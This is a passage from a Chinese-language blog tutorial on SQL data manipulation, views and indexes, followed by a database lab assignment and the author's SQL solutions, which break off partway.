的表，包含以下字段：</p><ul><li><code>id</code>：员工编号</li><li><code>first_name</code>：员工名字</li><li><code>last_name</code>：员工姓氏</li><li><code>salary</code>：员工工资</li></ul><p>如果想要删除 <code>id</code> 为 <code>1</code> 的员工记录，可以使用以下语句：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> id = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>如果想要删除表中所有的数据，可以使用以下语句（慎用）</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> employees;<br></code></pre></td></tr></table></figure><h5 id="（4）插入或替换数据（插入数据，如果数据存在，先删除再插入）REPLACE-INTO是替换"><a href="#（4）插入或替换数据（插入数据，如果数据存在，先删除再插入）REPLACE-INTO是替换" class="headerlink" title="（4）插入或替换数据（插入数据，如果数据存在，先删除再插入）REPLACE INTO是替换"></a>（4）插入或替换数据（插入数据，如果数据存在，先删除再插入）REPLACE INTO是替换</h5><p>语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">REPLACE <span class="hljs-keyword">INTO</span> 表名 (字段<span class="hljs-number">1</span>, 字段<span class="hljs-number">2</span>, ...)<br><span class="hljs-keyword">VALUES</span> (值<span class="hljs-number">1</span>, 值<span class="hljs-number">2</span>, ...);<br><br><br>表名：目标表的名称。<br>字段<span class="hljs-number">1</span>, 字段<span class="hljs-number">2</span>, ...：指定的表字段。<br>值<span class="hljs-number">1</span>, 值<span class="hljs-number">2</span>, ...：要插入的数据值。<br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----+</span>------<span class="hljs-code">+-----+</span><br><span class="hljs-section">| id | name | age |</span><br><span class="hljs-section">+----+------+-----+</span><br><span class="hljs-section">|  1 | 张三  |  25 |</span><br><span class="hljs-section">+----+------+-----+</span><br>原先表<br></code></pre></td></tr></table></figure><p>执行语句</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">REPLACE <span class="hljs-keyword">INTO</span> users (id, <span class="hljs-type">name</span>, age)<br><span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;李四&#x27;</span>, <span class="hljs-number">30</span>); 意思就是把原名数据更新为这个数据<br></code></pre></td></tr></table></figure><p>后来的表：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----+</span>------<span class="hljs-code">+-----+</span><br><span class="hljs-section">| id | name | age |</span><br><span class="hljs-section">+----+------+-----+</span><br><span class="hljs-section">|  1 | 李四  |  30 |</span><br><span class="hljs-section">+----+------+-----+</span><br></code></pre></td></tr></table></figure><h5 id="（5）插入或更新数据（插入数据，如果数据存在，则更新数据）"><a href="#（5）插入或更新数据（插入数据，如果数据存在，则更新数据）" class="headerlink" title="（5）插入或更新数据（插入数据，如果数据存在，则更新数据）"></a>（5）插入或更新数据（插入数据，如果数据存在，则更新数据）</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-operator">&lt;</span>表名<span class="hljs-operator">&gt;</span>(字段<span class="hljs-number">1</span>，字段<span class="hljs-number">2</span>，...) <span class="hljs-keyword">VALUES</span> (值<span class="hljs-number">1</span>，值<span class="hljs-number">2</span>，...) <span class="hljs-keyword">ON</span> DUPLICATE KEY <span class="hljs-keyword">UPDATE</span> <span class="hljs-operator">&lt;</span>条件表达式<span class="hljs-operator">&gt;</span>;<br><br>如果记录不存在（没有冲突）：插入新记录。<br>如果记录存在（主键或唯一索引冲突）：更新冲突记录的指定字段。<br><span class="hljs-keyword">VALUES</span>(字段) 用于引用插入数据的值。<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users (id, name, age)<br><span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-number">30</span>)<br><span class="hljs-keyword">ON</span> DUPLICATE KEY <span class="hljs-keyword">UPDATE</span> name <span class="hljs-operator">=</span> <span class="hljs-keyword">VALUES</span>(name), age <span class="hljs-operator">=</span> <span class="hljs-keyword">VALUES</span>(age);<br><br>如果 id<span class="hljs-operator">=</span><span class="hljs-number">1</span> 的记录不存在，则插入新记录。<br>如果 id<span class="hljs-operator">=</span><span class="hljs-number">1</span> 的记录已存在，则更新 name 和 age 字段为 <span class="hljs-string">&#x27;张三&#x27;</span> 和 <span class="hljs-number">30</span>。<br></code></pre></td></tr></table></figure><p><strong>UPDATE … SET … WHERE …</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> 表名<br><span class="hljs-keyword">SET</span> 字段<span class="hljs-number">1</span> <span class="hljs-operator">=</span> 值<span class="hljs-number">1</span>, 字段<span class="hljs-number">2</span> <span class="hljs-operator">=</span> 值<span class="hljs-number">2</span>, ...<br><span class="hljs-keyword">WHERE</span> 条件;<br><br><br>更新表中符合 <span class="hljs-keyword">WHERE</span> 条件的记录。<br>如果 <span class="hljs-keyword">WHERE</span> 条件没有匹配到记录，则不会进行任何操作<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> users<br><span class="hljs-keyword">SET</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;张三&#x27;</span>, age <span class="hljs-operator">=</span> <span class="hljs-number">30</span><br><span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><br>仅更新 id<span class="hljs-operator">=</span><span class="hljs-number">1</span> 的记录的 name 和 age 字段为 <span class="hljs-string">&#x27;张三&#x27;</span> 和 <span class="hljs-number">30</span>。<br>如果没有 id<span class="hljs-operator">=</span><span class="hljs-number">1</span> 的记录，则不执行任何操作。<br></code></pre></td></tr></table></figure><p><img src="/2024/11/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1e1009d74b60b462b02d71fb74ec235.png" alt="1e1009d74b60b462b02d71fb74ec235"></p><h5 id="6-快照：-INSERT-INTO-SELECT-语句从一个表复制数据，然后把数据插入到一个已存在的表中。"><a href="#6-快照：-INSERT-INTO-SELECT-语句从一个表复制数据，然后把数据插入到一个已存在的表中。" class="headerlink" title="(6) 快照： INSERT INTO SELECT 语句从一个表复制数据，然后把数据插入到一个已存在的表中。"></a>(6) 快照： INSERT INTO SELECT 语句从一个表复制数据，然后把数据插入到一个已存在的表中。</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> table2<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> table1;<br><br>table2：目标表，数据将被插入到这个表中。<br>table1：源表，数据从这个表中读取。<br><span class="hljs-operator">*</span>：表示选择 table1 的所有列。如果只想插入部分列，可以指定具体列名。<br><span class="hljs-keyword">SELECT</span>：用于查询数据，可以附加 <span class="hljs-keyword">WHERE</span> 或其他过滤条件<br></code></pre></td></tr></table></figure><p>示例：</p><p>table1内容：</p><p><img src="/2024/11/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/6bcfd796d424e00214693c57a43a42a.png" alt="6bcfd796d424e00214693c57a43a42a"></p><p>table2的内容什么也没有只有列，但是没数据</p><p>执行以下语句</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> table2<br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> table1;<br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/2024/11/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/f4d4cbe1a983ae063efba91851107c6.png" alt="f4d4cbe1a983ae063efba91851107c6"></p><h1 id="SQL-视图（Views）"><a href="#SQL-视图（Views）" class="headerlink" title="SQL 视图（Views）"></a>SQL 视图（Views）</h1><h2 id="SQL-CREATE-VIEW-语句"><a href="#SQL-CREATE-VIEW-语句" class="headerlink" title="SQL CREATE VIEW 语句"></a>SQL CREATE VIEW 语句</h2><p>在 SQL 中，视图是基于 SQL 语句的结果集的可视化的表。</p><p>视图包含行和列，就像一个真实的表。视图中的字段就是来自一个或多个数据库中的真实的表中的字段。</p><p>您可以向视图添加 SQL 函数、WHERE 以及 JOIN 语句，也可以呈现数据，就像这些数据来自于某个单一的表一样。</p><h3 id="SQL-CREATE-VIEW-实例"><a href="#SQL-CREATE-VIEW-实例" class="headerlink" title="SQL CREATE VIEW 实例"></a>SQL CREATE VIEW 实例</h3><p>假设你有一个包含员工信息的表 employees，包括以下列：employee_id、first_name、last_name、salary 和 department_id，现在，我们将创建一个视图，显示工资高于某个阈值的员工信息。</p><p>实例如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 创建包含高工资员工信息的视图</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> high_salary_employees <span class="hljs-keyword">AS</span><br><span class="hljs-keyword">SELECT</span> employee_id, first_name, last_name, salary<br><span class="hljs-keyword">FROM</span> employees<br><span class="hljs-keyword">WHERE</span> salary <span class="hljs-operator">&gt;</span> <span class="hljs-number">50000</span>;<br></code></pre></td></tr></table></figure><p>在这个例子中，我们创建了一个名为 high_salary_employees 的视图，该视图包含了那些工资高于 50000 的员工的信息。</p><p>现在，你可以像查询普通表一样使用这个视图：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 查询高工资员工视图</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span><br><span class="hljs-keyword">FROM</span> high_salary_employees;<br></code></pre></td></tr></table></figure><p>这将返回所有工资高于 50000 的员工的详细信息，而不需要每次都编写相同的筛选条件。</p><p>值得注意的是，视图本质上是一个虚拟的表，它并不存储数据，而是基于基础表的查询结果生成。因此，如果基础表的数据发生变化，视图的内容也会相应地更新</p><h3 id="SQL-更新视图"><a href="#SQL-更新视图" class="headerlink" title="SQL 更新视图"></a>SQL 更新视图</h3><p>在 SQL 中，你不能直接使用 UPDATE 语句来更新视图，因为视图是基于查询结果生成的虚拟表，而不是实际存储数据的表。更新（<code>UPDATE</code>）语句是用来修改数据库表中的数据的，但视图并不存储实际的数据，因此我们不能直接通过 <code>UPDATE</code> 语句来修改视图中的数据。然而，<strong>某些情况下</strong>，视图是可以通过更新底层表来间接更新的，但这通常是有限制的。更新视图的实质是通过更新视图所基于的表中的数据，然后视图会反映这些变化。其实意思就是直接拿UPDATE语句来更新表中的内容，而不是拿UPDATE来直接更新视图中的数据。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> table_name<br><span class="hljs-keyword">SET</span> column1 <span class="hljs-operator">=</span> value1, column2 <span class="hljs-operator">=</span> value2, ...<br><span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">condition</span>;<br></code></pre></td></tr></table></figure><p>其中，table_name 是基础表的名称，column1, column2, … 是要更新的列，value1, value2, … 是新的值，condition 是更新的条件。</p><p>现在，我们希望向 “Current Product List” 视图添加 “Category” 列。我们将通过下列 SQL 更新视图：</p><p>举例来说，如果你有一个名为 high_salary_employees 的视图，显示工资高于 50000 的员工信息，而这个视图基于 employees 表的查询结果，你可以通过以下步骤来更新数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 步骤 1: 更新 employees 表中的数据</span><br><span class="hljs-keyword">UPDATE</span> employees<br><span class="hljs-keyword">SET</span> salary <span class="hljs-operator">=</span> <span class="hljs-number">60000</span><br><span class="hljs-keyword">WHERE</span> employee_id <span class="hljs-operator">=</span> <span class="hljs-number">1001</span>;<br><br><span class="hljs-comment">-- 步骤 2: 查询更新后的高工资员工视图</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span><br><span class="hljs-keyword">FROM</span> high_salary_employees;<br></code></pre></td></tr></table></figure><p>这样，你更新了 employees 表中的数据，而视图 high_salary_employees 将反映出这些变化。</p><h3 id="SQL-撤销视图"><a href="#SQL-撤销视图" class="headerlink" title="SQL 撤销视图"></a>SQL 撤销视图</h3><p>在 SQL 中，撤销（或删除）视图是通过使用 DROP VIEW 语句来实现的。</p><p>DROP VIEW 语句用于从数据库中删除一个已存在的视图。语法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">VIEW</span> [IF <span class="hljs-keyword">EXISTS</span>] view_name;<br></code></pre></td></tr></table></figure><p> <strong>参数说明：</strong></p><ul><li><strong>DROP VIEW:</strong> 表示你要删除一个视图。</li><li><strong>IF EXISTS:</strong> 可选部分，用于检查视图是否存在。如果存在，则执行删除操作；如果不存在，不会发生错误。在某些数据库系统中，这是可选的。</li><li><strong>view_name:</strong> 指定要删除的视图的名称。</li></ul><p>在执行以下语句后，视图 high_salary_employees 将被从数据库中删除。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 删除名为 high_salary_employees 的视图</span><br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">VIEW</span> IF <span class="hljs-keyword">EXISTS</span> high_salary_employees;<br></code></pre></td></tr></table></figure><p>请注意，这并不影响基础表中的数据，只是删除了视图的定义。</p><p>如果你需要撤销或删除某个表中的数据，应该使用 DROP TABLE 语句。</p><p>在使用 DROP VIEW 语句时，请确保你真的想要删除该视图，因为一旦删除，将无法恢复视图的定义</p><h1 id="SQL-CREATE-INDEX-语句-索引"><a href="#SQL-CREATE-INDEX-语句-索引" class="headerlink" title="SQL CREATE INDEX 语句 索引"></a>SQL CREATE INDEX 语句 索引</h1><p>CREATE INDEX 语句用于在表中创建索引。</p><p>在不读取整个表的情况下，索引使数据库应用程序可以更快地查找数据。</p><h3 id="索引-其实就是为了提高查找速率"><a href="#索引-其实就是为了提高查找速率" class="headerlink" title="索引 其实就是为了提高查找速率"></a>索引 其实就是为了提高查找速率</h3><p>您可以在表中创建索引，以便更加快速高效地查询数据。</p><p>用户无法看到索引，它们只能被用来加速搜索&#x2F;查询。</p><p><strong>注释：</strong>更新一个包含索引的表需要比更新一个没有索引的表花费更多的时间，这是由于索引本身也需要更新。因此，理想的做法是仅仅在常常被搜索的列（以及表）上面创建索引。</p><h3 id="索引类型："><a href="#索引类型：" class="headerlink" title="索引类型："></a>索引类型：</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">普通索引（<span class="hljs-keyword">Default</span> <span class="hljs-keyword">Index</span>）：默认类型索引。<br><br>唯一索引（<span class="hljs-keyword">UNIQUE</span> <span class="hljs-keyword">INDEX</span>）：确保列中的值唯一。<br><br>全文索引（FULLTEXT <span class="hljs-keyword">INDEX</span>）：用于全文搜索（MySQL）。<br><br>聚簇索引（CLUSTERED <span class="hljs-keyword">INDEX</span>）：表数据按照索引排序（通常在主键上）。<br><br>非聚簇索引（NONCLUSTERED <span class="hljs-keyword">INDEX</span>）：索引和表数据独立存储。<br></code></pre></td></tr></table></figure><h3 id="SQL-CREATE-INDEX-语法"><a href="#SQL-CREATE-INDEX-语法" class="headerlink" title="SQL CREATE INDEX 语法"></a>SQL CREATE INDEX 语法</h3><p>在 SQL 中，CREATE INDEX 语句用于为表创建索引，从而加速特定查询的执行速度。索引类似于书的目录，通过预先排列数据来提高查询效率。它主要用于加速 SELECT 语句，尤其是在 WHERE、ORDER BY 或 JOIN 中过滤和排序大量数据时。</p><p>在表上创建一个简单的索引。允许使用重复的值：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> INDEX index_name<br><span class="hljs-keyword">ON</span> table_name (column1, column2, ...);<br><br>index_name: 索引的名称。<br>table_name: 要创建索引的表。<br>column1, column2,...: 用于创建索引的列（可以是单列或多列）。<br><span class="hljs-keyword">ON</span>: 指定在哪个表上创建索引。<br></code></pre></td></tr></table></figure><h3 id="CREATE-INDEX-实例"><a href="#CREATE-INDEX-实例" class="headerlink" title="CREATE INDEX 实例"></a>CREATE INDEX 实例</h3><h5 id="为单个列创建索引"><a href="#为单个列创建索引" class="headerlink" title="为单个列创建索引"></a>为单个列创建索引</h5><p>假设有一个名为 <code>employees</code> 的表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> employees (<br>    employee_id <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY</span> KEY,<br>    first_name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>),<br>    last_name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>),<br>    hire_date <span class="hljs-type">DATE</span>,<br>    salary <span class="hljs-type">DECIMAL</span>(<span class="hljs-number">10</span>, <span class="hljs-number">2</span>)<br>);<br></code></pre></td></tr></table></figure><h5 id="场景描述："><a href="#场景描述：" class="headerlink" title="场景描述："></a>场景描述：</h5><p>我们经常需要查询某个员工的 <code>last_name</code>，比如根据姓氏来查询员工，或者按 <code>last_name</code> 排序列出所有员工。如果不创建索引，数据库在执行这些查询时会扫描整个 <code>employees</code> 表，这样会很慢，尤其是在表中有很多数据时。</p><h5 id="创建索引："><a href="#创建索引：" class="headerlink" title="创建索引："></a>创建索引：</h5><p>为了提高查询效率，我们可以为 <code>last_name</code> 列创建一个索引：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> INDEX idx_last_name<br><span class="hljs-keyword">ON</span> employees (last_name);<br></code></pre></td></tr></table></figure><p>如果使用了索引</p><p>假设我们需要按 <code>last_name</code> 查找所有姓 “Smith” 的员工：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees<br><span class="hljs-keyword">WHERE</span> last_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Smith&#x27;</span>;<br></code></pre></td></tr></table></figure><p>由于我们在 <code>last_name</code> 列上创建了索引，数据库会利用这个索引快速查找到所有 <code>last_name</code> 为 “Smith” 的记录，而不需要扫描整个表。这大大提高了查询的效率，尤其当 <code>employees</code> 表很大时。</p><h5 id="排序查询："><a href="#排序查询：" class="headerlink" title="排序查询："></a>排序查询：</h5><p>我们还可以使用 <code>last_name</code> 来对员工进行排序：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> last_name;<br></code></pre></td></tr></table></figure><p>由于索引是基于 <code>last_name</code> 列的，它实际上已经是有序的，所以数据库可以直接使用索引的顺序来进行排序，这比全表排序更高效。</p><h5 id="比较有无索引的查询性能："><a href="#比较有无索引的查询性能：" class="headerlink" title="比较有无索引的查询性能："></a>比较有无索引的查询性能：</h5><ul><li><pre><code class="hljs">无索引时：查询会全表扫描，逐行检查是否符合 `last_name = &#39;Smith&#39;` 的条件。有索引时：查询只需要查找索引结构，快速定位到所有姓 &quot;Smith&quot; 的记录，而无需扫描全表。<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>##### 索引的缺点：<br><br><span class="hljs-number">1.</span> ```<br>   索引并不是万能的，虽然它加速了查询操作，但也有一些缺点：<br>   <br>   增加写操作的开销：每次插入、更新或删除数据时，数据库不仅需要修改表的数据，还需要更新索引。对于经常进行数据修改的表，过多的索引会影响性能。<br>   占用存储空间：索引本身需要占用额外的磁盘空间。虽然相较于数据表的存储空间，索引空间占用不算大，但如果索引过多，可能会影响磁盘空间的利用。<br></code></pre></td></tr></table></figure></code></pre></li></ul><h3 id="SQL-CREATE-UNIQUE-INDEX-语法"><a href="#SQL-CREATE-UNIQUE-INDEX-语法" class="headerlink" title="SQL CREATE UNIQUE INDEX 语法"></a>SQL CREATE UNIQUE INDEX 语法</h3><p>在表上创建一个唯一的索引。不允许使用重复的值：唯一的索引意味着两个行不能拥有相同的索引值。Creates a unique index on a table. Duplicate values are not allowed:</p><p>CREATE UNIQUE INDEX index_name<br> ON table_name (column_name)</p><p><strong>注释：</strong>用于创建索引的语法在不同的数据库中不一样。因此，检查您的数据库中创建索引的语法。 </p><h1 id="试验系统作业6："><a href="#试验系统作业6：" class="headerlink" title="试验系统作业6："></a>试验系统作业6：</h1><p>（1）定义信息系学生基本情况视图V_IS。</p><p>  （2）将Student,Course 和SC表中学生的学号，姓名，课程号，课程名，成绩定义为视图V_S_C_G。</p><p>  （3）将各系学生人数，平均年龄定义为视图V_NUM_AVG。</p><p>  （4）将各位学生学号、选修课程的门数及平均成绩定义为视图V_AVG_S_G。</p><p>  （5）将各门课程的课程号、选修人数及平均成绩定义为视图V_AVG_C_G。</p><p>  （6）用SQL语句完成以下视图操作，查看结果，并分析原因。</p><p>​    1）通过视图V_IS，将学号为“08001”的学生姓名更改为“张小立” ,并查看结果;</p><p>​    2）通过视图V_IS，新增加一个学生记录(‘08030’,’ 李莉’,18, ‘ 女’,’IS’)，并查看结果。</p><p>​    3）通过视图V_IS，删除学号为“08030”的学生信息，并查看结果。</p><p>​    4）通过视图V_S_C_G，将学号“08002”的姓名改为“刘晓晨”，能否实现若无法实现说明原因。</p><p>​    5）通过视图V_AVG_S_G，将学号“08003”的平均成绩改为90，能否实现若无法实现说明原因。</p><p>  （7）利用表和前面所建视图，查询平均成绩为90 分以上的学生学号、姓名和成绩；</p><p>  （8）利用表和前面所建视图，查询成绩大于课程平均成绩的学生学号、课程号和成绩；</p><p>  （9）利用表和前面所建视图，按系分组统计平均成绩80 分以上的人数，按降序排列。</p><p>  （10）为student 表创建一个复合索引i_sdept_sno ，以院系升序、学号降序。</p><p>  （11）在student 表的sname 列上建立普通降序索引。</p><p>  （12）在course 表的cname 列上建立唯一索引。</p><p>  （13）将索引i_sdept_sno 的名称改为i_s。</p><p>  （14）删除索引i_s。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs sql">#<span class="hljs-number">1.</span>定义信息系学生基本情况视图V_IS。<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> V_IS<br><span class="hljs-keyword">AS</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span><br><span class="hljs-keyword">FROM</span> student<br><span class="hljs-keyword">WHERE</span> sdept <span class="hljs-operator">=</span><span class="hljs-string">&#x27;is&#x27;</span>;<br><br>#<span class="hljs-number">2.</span>将Student,Course 和SC表中学生的学号，姓名，课程号，课程名，成绩定义为视图V_S_C_G。<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> V_S_C_G(sno,sname,cno,cnmae,grade)<br><span class="hljs-keyword">AS</span><br><span class="hljs-keyword">SELECT</span> student.sno,sname,sc.cno,course.Cname,grade<br><span class="hljs-keyword">FROM</span> student,course,sc<br><span class="hljs-keyword">WHERE</span> student.Sno<span class="hljs-operator">=</span>sc.sno <span class="hljs-keyword">AND</span> sc.Cno<span class="hljs-operator">=</span>course.Cno;<br><br>#<span class="hljs-number">3.</span>将各系学生人数，平均年龄定义为视图V_NUM_AVG。<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> V_NUM_AVG(sdept,num,asage)<br><span class="hljs-keyword">AS</span><br><span class="hljs-keyword">SELECT</span> sdept,<span class="hljs-built_in">count</span>(<span 